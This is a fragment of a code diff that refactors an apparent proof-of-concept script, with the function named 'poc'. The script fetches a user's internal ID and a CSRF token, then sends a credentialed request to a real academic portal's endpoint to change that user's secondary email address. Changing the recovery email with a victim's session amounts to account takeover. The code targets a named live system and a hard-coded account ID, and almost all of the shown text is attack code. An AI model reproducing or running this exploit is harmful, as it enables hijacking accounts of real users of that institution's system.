@@ -17,7 +17,7 @@ async function getCsrfToken(pessoaFisicaPk) {
     return csrfToken
   }
 
-async function trocarEmail(csrfToken) {
+async function trocarEmail(pessoaFisicaPk, csrfToken) {
   res = await fetch("https://suap.ifpb.edu.br/comum/atualizar_email_secundario/183224/", {
   "credentials": "include",
   "headers": {
@@ -39,4 +39,11 @@ async function trocarEmail(csrfToken) {
   return res.status
 }
 
-getPessoaFisicaPk().then(getCsrfToken).then(trocarEmail).then(console.log)
+async function poc() {
+  pessoaFisicaPk = await getPessoaFisicaPk()
+  csrfToken = await getCsrfToken(pessoaFisicaPk)
+  status = await trocarEmail(pessoaFisicaPk, csrfToken)
+  return status
+
+}
+poc().then(console.log)
